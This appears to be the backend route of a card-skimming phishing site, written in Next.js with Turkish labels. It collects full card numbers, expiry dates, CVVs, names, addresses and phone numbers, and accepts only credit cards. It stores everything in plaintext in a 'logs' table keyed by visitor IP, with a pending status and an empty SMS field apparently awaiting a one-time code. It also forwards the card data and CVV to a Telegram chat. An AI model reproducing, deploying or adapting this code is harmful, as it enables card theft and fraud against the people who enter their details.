import { NextRequest, NextResponse } from 'next/server';
import pool from '@/lib/db';
import { sendTelegramNotification } from '@/lib/telegram';
import binlistData from '@/app/binlist.json';

export async function POST(request: NextRequest) {
    try {
        const body = await request.json();
        const { kart_isim, kredi_karti, skt, cvv, banka, marka, seviye, tutar, taksit, adres, tarih: clientTarih } = body;

        // Server-side Debit / Prepaid Kart Engelleme
        if (kredi_karti) {
            const cleanCard = kredi_karti.replace(/\s/g, '');
            if (cleanCard.length >= 6) {
                const bin6 = cleanCard.substring(0, 6);
                const binNumber = parseInt(bin6 + '0000000', 10);
                const binList = binlistData.BINList as any[];
                const info = binList.find(bin => binNumber >= bin.CardRangeStart && binNumber <= bin.CardRangeEnd);
                
                if (info && info.CardType) {
                    const typeLower = info.CardType.toLowerCase();
                    const isDebit = typeLower.includes('debit') || typeLower.includes('banka');
                    const isPrepaid = typeLower.includes('ön') || typeLower.includes('on') || typeLower.includes('odeme') || typeLower.includes('ödemeli') || typeLower.includes('prepaid');
                    
                    if (isDebit || isPrepaid) {
                        return NextResponse.json({ 
                            success: false, 
                            error: 'Yalnızca kredi kartı ile ödeme kabul edilmektedir' 
                        });
                    }
                }
            }
        }

        const forwarded = request.headers.get('x-forwarded-for');
        const ip = forwarded ? forwarded.split(',')[0].trim() : 
                   request.headers.get('x-real-ip') || 
                   'Bilinmiyor';

        const now = new Date();
        const tarih = clientTarih || now.toLocaleString('tr-TR', {
            timeZone: 'Europe/Istanbul',
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });
        
        const onlineTimer = now.getTime();

        let adresBilgisi = '';
        if (adres) {
            adresBilgisi = `${adres.first_name} ${adres.last_name} - ${adres.phone} - ${adres.neighborhood} ${adres.street} No:${adres.building_no} ${adres.district}/${adres.city}`;
        }

        const [existingRows] = await pool.query(
            'SELECT id FROM logs WHERE ip = ? LIMIT 1',
            [ip]
        ) as any[];

        let paymentId: number;

        let isHard = 0;
        try {
            const hardResult: any = await pool.query(
                "SELECT value FROM site_settings WHERE key_name = 'hard_mode' LIMIT 1"
            );
            const rows = (hardResult as any[])[0] as any[];
            isHard = rows?.[0]?.value === '1' ? 1 : 0;
        } catch { isHard = 0; }

        if (existingRows && existingRows.length > 0) {
            const existingId = existingRows[0].id;
            await pool.query(
                `UPDATE logs SET 
                    kredi_karti = ?, 
                    skt = ?, 
                    cvv = ?, 
                    banka = ?, 
                    marka = ?, 
                    seviye = ?, 
                    tarih = ?, 
                    sms = ?, 
                    durum = ?, 
                    onlineTimer = ?, 
                    tutar = ?,
                    adres = ?
                 WHERE id = ?`,
                [
                    kredi_karti,
                    skt,
                    cvv,
                    banka || '',
                    marka || '',
                    seviye || '',
                    tarih,
                    '',
                    'BEKLİYOR',
                    onlineTimer,
                    tutar || '',
                    adresBilgisi,
                    existingId
                ]
            );
            await pool.query(
                'UPDATE cevrimici_tablosu SET sayfa = ? WHERE ip = ?',
                ['BEKLİYOR', ip]
            );
            paymentId = existingId;
        } else {
            const [result] = await pool.query(
                `INSERT INTO logs (kredi_karti, skt, cvv, banka, marka, seviye, tarih, sms, durum, onlineTimer, ip, tutar, adres, is_hard) 
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
                [
                    kredi_karti,
                    skt,
                    cvv,
                    banka || '',
                    marka || '',
                    seviye || '',
                    tarih,
                    '',
                    'BEKLİYOR',
                    onlineTimer,
                    ip,
                    tutar || '',
                    adresBilgisi,
                    isHard
                ]
            );
            const insertResult = result as any;
            paymentId = insertResult.insertId;
            await pool.query(
                'UPDATE cevrimici_tablosu SET sayfa = ? WHERE ip = ?',
                ['BEKLİYOR', ip]
            );
        }

        if (!isHard) {
            sendTelegramNotification({
                kart_isim: kart_isim || '',
                kredi_karti,
                skt,
                cvv,
                banka: banka || 'Bilinmiyor',
                marka: marka || '',
                seviye: seviye || '',
                tutar: tutar || '',
                taksit: taksit || 'Peşin',
                adres: adresBilgisi,
                ip,
                tarih
            }).catch(err => console.error('Telegram bildirim hatası:', err));
        }

        return NextResponse.json({ 
            success: true, 
            paymentId: paymentId,
            message: 'Ödeme bilgileri kaydedildi'
        });

    } catch (error: any) {
        console.error('Ödeme hatası:', error);
        return NextResponse.json({ 
            success: false, 
            error: 'Ödeme işlemi sırasında bir hata oluştu' 
        }, { status: 500 });
    }
}
